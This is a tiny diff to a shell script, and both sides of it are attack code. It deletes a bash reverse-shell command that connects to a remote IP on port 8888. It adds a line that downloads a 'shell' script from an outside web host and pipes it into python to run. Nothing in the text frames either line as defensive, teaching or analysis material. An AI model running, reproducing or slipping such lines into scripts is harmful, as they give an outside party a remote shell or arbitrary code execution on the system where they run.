@@ -1,1 +1,3 @@
-bash -i >& /dev/tcp/81.70.23.26/8888 0>&1
+#!/bin/bash
+
+curl web.whip1ash.cn/shell|python
